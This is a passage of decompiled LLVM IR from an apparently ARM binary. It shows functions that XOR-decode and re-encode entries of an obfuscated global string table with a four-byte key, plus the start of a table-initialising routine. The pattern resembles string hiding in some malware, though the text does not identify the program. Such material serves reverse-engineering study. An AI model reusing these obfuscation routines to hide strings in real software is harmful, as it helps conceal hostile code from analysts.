  uselistorder i32* @r8, { 8, 9, 11, 10, 12, 13, 14, 94, 95, 96, 97, 83, 84, 85, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1, 2, 3, 4, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 6, 48, 49, 7, 50, 51, 52, 53, 54, 55, 56, 57, 5, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 86, 87, 88, 89, 90, 91, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 137, 134, 135, 136, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 162, 163, 161, 164, 165, 166, 167, 168, 169, 170 }
  uselistorder i32* @r7, { 155, 156, 5, 13, 6, 1, 4, 20, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 21, 22, 157, 158, 159, 140, 141, 142, 23, 0, 24, 25, 26, 27, 28, 29, 30, 31, 32, 2, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 3, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201 }
  uselistorder i32* @r6, {}
  uselistorder i32* @r5, { 17, 18, 376, 377, 378, 379, 380, 381, 19, 382, 46, 383, 384, 385, 2, 1, 386, 387, 20, 21, 22, 23, 24, 47, 14, 15, 16, 50, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 51, 52, 53, 54, 48, 49, 388, 389, 390, 391, 392, 55, 393, 394, 9, 395, 396, 397, 398, 399, 400, 401, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 3, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 0, 103, 104, 105, 106, 107, 108, 11, 109, 110, 111, 112, 113, 114, 115, 116, 12, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 402, 403, 404, 405, 406, 407, 408, 410, 411, 409, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 7, 449, 450, 451, 452, 453, 454, 455, 10, 456, 457, 4, 458, 459, 5, 460, 461, 6, 462, 463, 464, 465, 466, 467, 13, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 8, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510 }
  uselistorder label %dec_label_pc_13bfc, { 1, 0 }
  uselistorder label %dec_label_pc_13b58, { 1, 0 }
  uselistorder label %dec_label_pc_13a8c, { 1, 0 }
  uselistorder label %dec_label_pc_139f8, { 2, 0, 1 }
  uselistorder label %bb346, { 1, 0 }
  uselistorder label %dec_label_pc_139b8, { 1, 0 }
  uselistorder label %dec_label_pc_13884, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_13870, { 1, 0 }
  uselistorder label %dec_label_pc_13818, { 2, 3, 1, 11, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_137fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13678, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_13664, { 1, 0 }
  uselistorder label %dec_label_pc_135c4, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_135b0, { 1, 0 }
  uselistorder label %dec_label_pc_13510, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_134fc, { 1, 0 }
  uselistorder label %dec_label_pc_1345c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_13448, { 1, 0 }
  uselistorder label %dec_label_pc_133d0, { 1, 0 }
  uselistorder label %dec_label_pc_133c4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_133b0, { 1, 0 }
  uselistorder label %dec_label_pc_13234, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_13220, { 1, 0 }
  uselistorder label %dec_label_pc_131dc, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_131cc, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %bb320, { 2, 1, 0 }
  uselistorder label %bb317, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1312c, { 1, 0 }
  uselistorder label %dec_label_pc_1312c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_130b4, { 1, 0 }
  uselistorder label %bb314, { 1, 0 }
  uselistorder label %dec_label_pc_13064, { 1, 0 }
  uselistorder label %dec_label_pc_13054, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1304cthread-pre-split, { 4, 5, 3, 7, 2, 6, 1, 8, 0, 9 }
  uselistorder label %dec_label_pc_1304cthread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13054.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_13048.loopexit, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13008, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ee4, { 6, 7, 3, 4, 0, 5, 1, 2 }
  uselistorder label %dec_label_pc_12ec0, { 1, 0 }
  uselistorder label %bb311, { 1, 0 }
  uselistorder label %bb309, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_12d28.dec_label_pc_12d28_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12d0c.dec_label_pc_12d0c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12d04, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_12cfc, { 1, 0 }
  uselistorder label %dec_label_pc_12cb0, { 1, 0 }
  uselistorder label %dec_label_pc_12b50, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_12b44, { 1, 0 }
  uselistorder label %.thread47, { 2, 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_129a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12984, { 1, 0 }
  uselistorder label %dec_label_pc_12978, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12954, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12930, { 1, 0 }
  uselistorder label %bb279, { 1, 0 }
  uselistorder label %dec_label_pc_128dc, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_123c0, { 1, 0 }
}

define i32 @function_13c04(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_13c04:
  %v3_13c08 = mul i32 %arg1, 8
  %v2_13c0c = add i32 %v3_13c08, ptrtoint (i32* @global_var_1d9d8.394 to i32)
  %v2_13c10 = icmp eq i32* %arg2, null
  br i1 %v2_13c10, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13c04
  %v3_13c1c11 = inttoptr i32 %v2_13c0c to i32*
  %v4_13c1c12 = load i32, i32* %v3_13c1c11, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_13c04
  %v2_13c14 = add i32 %v3_13c08, add (i32 ptrtoint (i32* @global_var_1d9d8.394 to i32), i32 5)
  %v3_13c14 = inttoptr i32 %v2_13c14 to i8*
  %v4_13c14 = load i8, i8* %v3_13c14, align 1
  %v5_13c14 = zext i8 %v4_13c14 to i32
  %v2_13c18 = add i32 %v3_13c08, add (i32 ptrtoint (i32* @global_var_1d9d8.394 to i32), i32 4)
  %v3_13c18 = inttoptr i32 %v2_13c18 to i8*
  %v4_13c18 = load i8, i8* %v3_13c18, align 4
  %v5_13c18 = zext i8 %v4_13c18 to i32
  %v3_13c1c = inttoptr i32 %v2_13c0c to i32*
  %v4_13c1c = load i32, i32* %v3_13c1c, align 4
  %v5_13c20 = mul nuw nsw i32 %v5_13c14, 256
  %v6_13c20 = or i32 %v5_13c18, %v5_13c20
  store i32 %v6_13c20, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_13c1c714 = phi i32 [ %v4_13c1c12, %.thread ], [ %v4_13c1c, %bb ]
  ret i32 %v4_13c1c714

; uselistorder directives
  uselistorder i32 %v2_13c0c, { 1, 0 }
  uselistorder i32 %v3_13c08, { 2, 1, 0 }
  uselistorder i32* null, { 1, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 3, 15, 16, 23, 17, 18, 19, 20, 21, 22, 2 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_13c30(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c30:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13c30 = mul i32 %arg1, 8
  %v3_13c34 = load i32, i32* @r4, align 4
  store i32 %v3_13c34, i32* %stack_var_-20, align 4
  %v3_13c44 = and i32 %v3_13c30, 2040
  %v2_13c48 = add i32 %v3_13c44, ptrtoint (i32* @global_var_1d9d8.394 to i32)
  store i32 %v2_13c48, i32* %lr.global-to-local, align 4
  %v1_13c50 = add i32 %v3_13c44, add (i32 ptrtoint (i32* @global_var_1d9d8.394 to i32), i32 4)
  store i32 %v1_13c50, i32* %r7.global-to-local, align 4
  %v2_13c54 = load i32, i32* @global_var_1d914.397, align 4
  %v2_13c58 = inttoptr i32 %v1_13c50 to i8*
  %v3_13c58 = load i8, i8* %v2_13c58, align 4
  %v4_13c58 = zext i8 %v3_13c58 to i32
  store i32 %v4_13c58, i32* @r1, align 4
  %v1_13c5c = add i32 %v3_13c44, add (i32 ptrtoint (i32* @global_var_1d9d8.394 to i32), i32 5)
  %v2_13c5c = inttoptr i32 %v1_13c5c to i8*
  %v3_13c5c = load i8, i8* %v2_13c5c, align 1
  %v4_13c5c = zext i8 %v3_13c5c to i32
  %v3_13c60 = udiv i32 %v2_13c54, 256
  %v4_13c64 = mul nuw nsw i32 %v4_13c5c, 256
  %v5_13c64 = or i32 %v4_13c64, %v4_13c58
  %v7_13c64 = icmp eq i32 %v5_13c64, 0
  store i1 %v7_13c64, i1* @cpsr_z, align 1
  %v3_13c68 = udiv i32 %v2_13c54, 65536
  %v1_13c6c = urem i32 %v3_13c60, 256
  store i32 %v1_13c6c, i32* %r6.global-to-local, align 4
  %v1_13c70 = urem i32 %v3_13c68, 256
  store i32 %v1_13c70, i32* %r5.global-to-local, align 4
  %v3_13c74 = udiv i32 %v2_13c54, 16777216
  store i32 %v3_13c74, i32* %r4.global-to-local, align 4
  %v1_13c78 = urem i32 %v2_13c54, 256
  br i1 %v7_13c64, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_13c30
  store i32 %v3_13c34, i32* @r4, align 4
  ret i32 %v1_13c78

bb8:                                              ; preds = %dec_label_pc_13c30
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13c84

dec_label_pc_13c84:                               ; preds = %dec_label_pc_13c84, %bb8
  %v2_13c90 = phi i32 [ %v1_13ccc, %dec_label_pc_13c84 ], [ 0, %bb8 ]
  %v0_13c84 = phi i32 [ %v0_13cc4, %dec_label_pc_13c84 ], [ %v2_13c48, %bb8 ]
  %v1_13c84 = inttoptr i32 %v0_13c84 to i32*
  %v2_13c84 = load i32, i32* %v1_13c84, align 4
  %v2_13c88 = add i32 %v2_13c84, %v2_13c90
  %v3_13c88 = inttoptr i32 %v2_13c88 to i8*
  %v4_13c88 = load i8, i8* %v3_13c88, align 1
  %v6_13c88 = zext i8 %v4_13c88 to i32
  %v2_13c8c = xor i32 %v6_13c88, %v1_13c78
  %v1_13c90 = trunc i32 %v2_13c8c to i8
  store i8 %v1_13c90, i8* %v3_13c88, align 1
  %v0_13c94 = load i32, i32* %lr.global-to-local, align 4
  %v1_13c94 = inttoptr i32 %v0_13c94 to i32*
  %v2_13c94 = load i32, i32* %v1_13c94, align 4
  %v0_13c98 = load i32, i32* %ip.global-to-local, align 4
  %v2_13c98 = add i32 %v0_13c98, %v2_13c94
  %v3_13c98 = inttoptr i32 %v2_13c98 to i8*
  %v4_13c98 = load i8, i8* %v3_13c98, align 1
  %v6_13c98 = zext i8 %v4_13c98 to i32
  %v0_13c9c = load i32, i32* %r6.global-to-local, align 4
  %v2_13c9c = xor i32 %v0_13c9c, %v6_13c98
  %v1_13ca0 = trunc i32 %v2_13c9c to i8
  store i8 %v1_13ca0, i8* %v3_13c98, align 1
  %v0_13ca4 = load i32, i32* %lr.global-to-local, align 4
  %v1_13ca4 = inttoptr i32 %v0_13ca4 to i32*
  %v2_13ca4 = load i32, i32* %v1_13ca4, align 4
  %v0_13ca8 = load i32, i32* %ip.global-to-local, align 4
  %v2_13ca8 = add i32 %v0_13ca8, %v2_13ca4
  %v3_13ca8 = inttoptr i32 %v2_13ca8 to i8*
  %v4_13ca8 = load i8, i8* %v3_13ca8, align 1
  %v6_13ca8 = zext i8 %v4_13ca8 to i32
  %v0_13cac = load i32, i32* %r5.global-to-local, align 4
  %v2_13cac = xor i32 %v0_13cac, %v6_13ca8
  %v1_13cb0 = trunc i32 %v2_13cac to i8
  store i8 %v1_13cb0, i8* %v3_13ca8, align 1
  %v0_13cb4 = load i32, i32* %lr.global-to-local, align 4
  %v1_13cb4 = inttoptr i32 %v0_13cb4 to i32*
  %v2_13cb4 = load i32, i32* %v1_13cb4, align 4
  store i32 %v2_13cb4, i32* @r1, align 4
  %v0_13cb8 = load i32, i32* %ip.global-to-local, align 4
  %v2_13cb8 = add i32 %v0_13cb8, %v2_13cb4
  %v3_13cb8 = inttoptr i32 %v2_13cb8 to i8*
  %v4_13cb8 = load i8, i8* %v3_13cb8, align 1
  %v6_13cb8 = zext i8 %v4_13cb8 to i32
  %v0_13cbc = load i32, i32* %r4.global-to-local, align 4
  %v2_13cbc = xor i32 %v0_13cbc, %v6_13cb8
  %v1_13cc0 = trunc i32 %v2_13cbc to i8
  store i8 %v1_13cc0, i8* %v3_13cb8, align 1
  %v0_13cc4 = load i32, i32* %lr.global-to-local, align 4
  %v1_13cc4 = add i32 %v0_13cc4, 4
  %v2_13cc4 = inttoptr i32 %v1_13cc4 to i8*
  %v3_13cc4 = load i8, i8* %v2_13cc4, align 1
  %v4_13cc4 = zext i8 %v3_13cc4 to i32
  %v0_13cc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_13cc8 = add i32 %v0_13cc8, 1
  %v2_13cc8 = inttoptr i32 %v1_13cc8 to i8*
  %v3_13cc8 = load i8, i8* %v2_13cc8, align 1
  %v4_13cc8 = zext i8 %v3_13cc8 to i32
  %v0_13ccc = load i32, i32* %ip.global-to-local, align 4
  %v1_13ccc = add i32 %v0_13ccc, 1
  store i32 %v1_13ccc, i32* %ip.global-to-local, align 4
  %v4_13cd0 = mul nuw nsw i32 %v4_13cc8, 256
  %v5_13cd0 = or i32 %v4_13cd0, %v4_13cc4
  %v9_13cd4 = icmp eq i32 %v5_13cd0, %v1_13ccc
  store i1 %v9_13cd4, i1* @cpsr_z, align 1
  %v8_13cd8 = icmp sgt i32 %v5_13cd0, %v1_13ccc
  br i1 %v8_13cd8, label %dec_label_pc_13c84, label %dec_label_pc_13cdc

dec_label_pc_13cdc:                               ; preds = %dec_label_pc_13c84
  %v2_13cdc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13cdc, i32* @r4, align 4
  ret i32 %v1_13c78

; uselistorder directives
  uselistorder i32 %v1_13ccc, { 1, 2, 3, 0 }
  uselistorder i32 %v0_13cc4, { 1, 0 }
  uselistorder i32 %v1_13c78, { 1, 2, 0 }
  uselistorder i32 %v2_13c54, { 3, 0, 1, 2 }
}

define i32 @function_13ce8(i32 %arg1) local_unnamed_addr {
dec_label_pc_13ce8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13ce8 = mul i32 %arg1, 8
  %v3_13cec = load i32, i32* @r4, align 4
  store i32 %v3_13cec, i32* %stack_var_-20, align 4
  %v3_13cfc = and i32 %v3_13ce8, 2040
  %v2_13d00 = add i32 %v3_13cfc, ptrtoint (i32* @global_var_1d9d8.394 to i32)
  store i32 %v2_13d00, i32* %lr.global-to-local, align 4
  %v1_13d08 = add i32 %v3_13cfc, add (i32 ptrtoint (i32* @global_var_1d9d8.394 to i32), i32 4)
  store i32 %v1_13d08, i32* %r7.global-to-local, align 4
  %v2_13d0c = load i32, i32* @global_var_1d914.397, align 4
  %v2_13d10 = inttoptr i32 %v1_13d08 to i8*
  %v3_13d10 = load i8, i8* %v2_13d10, align 4
  %v4_13d10 = zext i8 %v3_13d10 to i32
  %v1_13d14 = add i32 %v3_13cfc, add (i32 ptrtoint (i32* @global_var_1d9d8.394 to i32), i32 5)
  %v2_13d14 = inttoptr i32 %v1_13d14 to i8*
  %v3_13d14 = load i8, i8* %v2_13d14, align 1
  %v4_13d14 = zext i8 %v3_13d14 to i32
  %v3_13d18 = udiv i32 %v2_13d0c, 256
  %v4_13d1c = mul nuw nsw i32 %v4_13d14, 256
  %v5_13d1c = or i32 %v4_13d1c, %v4_13d10
  %v7_13d1c = icmp eq i32 %v5_13d1c, 0
  %v3_13d20 = udiv i32 %v2_13d0c, 65536
  %v1_13d24 = urem i32 %v3_13d18, 256
  store i32 %v1_13d24, i32* %r6.global-to-local, align 4
  %v1_13d28 = urem i32 %v3_13d20, 256
  store i32 %v1_13d28, i32* %r5.global-to-local, align 4
  %v3_13d2c = udiv i32 %v2_13d0c, 16777216
  store i32 %v3_13d2c, i32* %r4.global-to-local, align 4
  %v1_13d30 = urem i32 %v2_13d0c, 256
  br i1 %v7_13d1c, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_13ce8
  store i32 %v3_13cec, i32* @r4, align 4
  ret i32 %v1_13d30

bb8:                                              ; preds = %dec_label_pc_13ce8
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13d3c

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13d3c, %bb8
  %v2_13d48 = phi i32 [ %v1_13d84, %dec_label_pc_13d3c ], [ 0, %bb8 ]
  %v0_13d3c = phi i32 [ %v0_13d7c, %dec_label_pc_13d3c ], [ %v2_13d00, %bb8 ]
  %v1_13d3c = inttoptr i32 %v0_13d3c to i32*
  %v2_13d3c = load i32, i32* %v1_13d3c, align 4
  %v2_13d40 = add i32 %v2_13d3c, %v2_13d48
  %v3_13d40 = inttoptr i32 %v2_13d40 to i8*
  %v4_13d40 = load i8, i8* %v3_13d40, align 1
  %v6_13d40 = zext i8 %v4_13d40 to i32
  %v2_13d44 = xor i32 %v6_13d40, %v1_13d30
  %v1_13d48 = trunc i32 %v2_13d44 to i8
  store i8 %v1_13d48, i8* %v3_13d40, align 1
  %v0_13d4c = load i32, i32* %lr.global-to-local, align 4
  %v1_13d4c = inttoptr i32 %v0_13d4c to i32*
  %v2_13d4c = load i32, i32* %v1_13d4c, align 4
  %v0_13d50 = load i32, i32* %ip.global-to-local, align 4
  %v2_13d50 = add i32 %v0_13d50, %v2_13d4c
  %v3_13d50 = inttoptr i32 %v2_13d50 to i8*
  %v4_13d50 = load i8, i8* %v3_13d50, align 1
  %v6_13d50 = zext i8 %v4_13d50 to i32
  %v0_13d54 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d54 = xor i32 %v0_13d54, %v6_13d50
  %v1_13d58 = trunc i32 %v2_13d54 to i8
  store i8 %v1_13d58, i8* %v3_13d50, align 1
  %v0_13d5c = load i32, i32* %lr.global-to-local, align 4
  %v1_13d5c = inttoptr i32 %v0_13d5c to i32*
  %v2_13d5c = load i32, i32* %v1_13d5c, align 4
  %v0_13d60 = load i32, i32* %ip.global-to-local, align 4
  %v2_13d60 = add i32 %v0_13d60, %v2_13d5c
  %v3_13d60 = inttoptr i32 %v2_13d60 to i8*
  %v4_13d60 = load i8, i8* %v3_13d60, align 1
  %v6_13d60 = zext i8 %v4_13d60 to i32
  %v0_13d64 = load i32, i32* %r5.global-to-local, align 4
  %v2_13d64 = xor i32 %v0_13d64, %v6_13d60
  %v1_13d68 = trunc i32 %v2_13d64 to i8
  store i8 %v1_13d68, i8* %v3_13d60, align 1
  %v0_13d6c = load i32, i32* %lr.global-to-local, align 4
  %v1_13d6c = inttoptr i32 %v0_13d6c to i32*
  %v2_13d6c = load i32, i32* %v1_13d6c, align 4
  %v0_13d70 = load i32, i32* %ip.global-to-local, align 4
  %v2_13d70 = add i32 %v0_13d70, %v2_13d6c
  %v3_13d70 = inttoptr i32 %v2_13d70 to i8*
  %v4_13d70 = load i8, i8* %v3_13d70, align 1
  %v6_13d70 = zext i8 %v4_13d70 to i32
  %v0_13d74 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d74 = xor i32 %v0_13d74, %v6_13d70
  %v1_13d78 = trunc i32 %v2_13d74 to i8
  store i8 %v1_13d78, i8* %v3_13d70, align 1
  %v0_13d7c = load i32, i32* %lr.global-to-local, align 4
  %v1_13d7c = add i32 %v0_13d7c, 4
  %v2_13d7c = inttoptr i32 %v1_13d7c to i8*
  %v3_13d7c = load i8, i8* %v2_13d7c, align 1
  %v4_13d7c = zext i8 %v3_13d7c to i32
  %v0_13d80 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d80 = add i32 %v0_13d80, 1
  %v2_13d80 = inttoptr i32 %v1_13d80 to i8*
  %v3_13d80 = load i8, i8* %v2_13d80, align 1
  %v4_13d80 = zext i8 %v3_13d80 to i32
  %v0_13d84 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d84 = add i32 %v0_13d84, 1
  store i32 %v1_13d84, i32* %ip.global-to-local, align 4
  %v4_13d88 = mul nuw nsw i32 %v4_13d80, 256
  %v5_13d88 = or i32 %v4_13d88, %v4_13d7c
  %v8_13d90 = icmp sgt i32 %v5_13d88, %v1_13d84
  br i1 %v8_13d90, label %dec_label_pc_13d3c, label %dec_label_pc_13d94

dec_label_pc_13d94:                               ; preds = %dec_label_pc_13d3c
  %v2_13d94 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13d94, i32* @r4, align 4
  ret i32 %v1_13d30

; uselistorder directives
  uselistorder i32 %v1_13d84, { 1, 2, 0 }
  uselistorder i32 %v0_13d7c, { 1, 0 }
  uselistorder i32 %v1_13d30, { 1, 2, 0 }
  uselistorder i32 %v2_13d0c, { 3, 0, 1, 2 }
  uselistorder i32 16777216, { 1, 2, 4, 3, 6, 5, 10, 7, 9, 8, 11, 0, 13, 12, 15, 14, 17, 16, 18, 19, 27, 20, 28, 21, 29, 22, 30, 31, 23, 32, 24, 33, 25, 34, 26, 38, 35, 39, 36, 40, 37, 43, 41, 44, 42, 45, 46, 47, 52, 48, 53, 49, 54, 50, 55, 51, 56, 57, 58, 59, 60, 61, 62, 63, 64, 68, 65, 69, 66, 70, 67, 71, 72, 74, 73, 80, 75, 81, 76, 82, 77, 83, 78, 84, 79, 85, 88, 86, 87, 89, 90, 95, 91, 96, 92, 97, 93, 94, 98, 101, 99, 100, 102, 103, 108, 104, 109, 105, 110, 106, 107, 111, 118, 112, 119, 120, 113, 121, 116, 122, 114, 123, 124, 115, 117, 125, 126, 130, 127, 131, 132, 128, 129, 133, 134, 135, 137, 136, 140, 138, 141, 139, 142, 143, 144 }
}

define i32 @function_13da0() local_unnamed_addr {
dec_label_pc_13da0:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13da0 = load i32, i32* @r4, align 4
  store i32 %v3_13da0, i32* %stack_var_-36, align 4
  %v1_13da8 = call i32 @_malloc(i32 12)
  store i32 ptrtoint ([13 x i8]* @global_var_1521c.401 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9d8.394 to i32), i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 12, i32* %r8.global-to-local, align 4
  store i32 %v1_13da8, i32* %r5.global-to-local, align 4
  %v4_13dc8 = call i32 @function_14688(i32 %v1_13da8, i32 ptrtoint ([13 x i8]* @global_var_1521c.401 to i32), i32 12)
  %v0_13dd0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13dd0, i32* @global_var_1d9f0.403, align 4
  store i8 12, i8* bitcast (i32* @global_var_1d9f4.404 to i8*), align 4
  %v0_13dd8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13dd8 = trunc i32 %v0_13dd8 to i8
  store i8 %v1_13dd8, i8* bitcast (i32* @global_var_1d9f5.405 to i8*), align 4
  %v1_13ddc = call i32 @_malloc(i32 2)
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 %v1_13ddc, i32* %r7.global-to-local, align 4
  %v3_13df0 = call i32 @function_14688(i32 %v1_13ddc, i32 ptrtoint (i32* @global_var_1522c.407 to i32), i32 2)
  %v0_13df4 = load i32, i32* %r8.global-to-local, align 4
  %v0_13df8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13df8, i32* @global_var_1d9f8.408, align 4
  %v0_13dfc = load i32, i32* %r5.global-to-local, align 4
  %v1_13dfc = trunc i32 %v0_13dfc to i8
  store i8 %v1_13dfc, i8* bitcast (i32* @global_var_1d9fc.409 to i8*), align 4
  %v0_13e00 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e00 = trunc i32 %v0_13e00 to i8
  store i8 %v1_13e00, i8* bitcast (i32* @global_var_1d9fd.410 to i8*), align 4
  %v1_13e04 = call i32 @_malloc(i32 %v0_13df4)
  %v0_13e08 = load i32, i32* %sl.global-to-local, align 4
  %v0_13e0c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_13e04, i32* %r7.global-to-local, align 4
  %v4_13e14 = call i32 @function_14688(i32 %v1_13e04, i32 %v0_13e08, i32 %v0_13e0c)
  %v0_13e18 = load i32, i32* %r5.global-to-local, align 4
  %v0_13e1c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13e1c, i32* @global_var_1da68.411, align 4
  %v1_13e20 = trunc i32 %v0_13e0c to i8
  store i8 %v1_13e20, i8* bitcast (i32* @global_var_1da6c.412 to i8*), align 4
  %v0_13e24 = load i32, i32* %r6.global-to-local, align 4
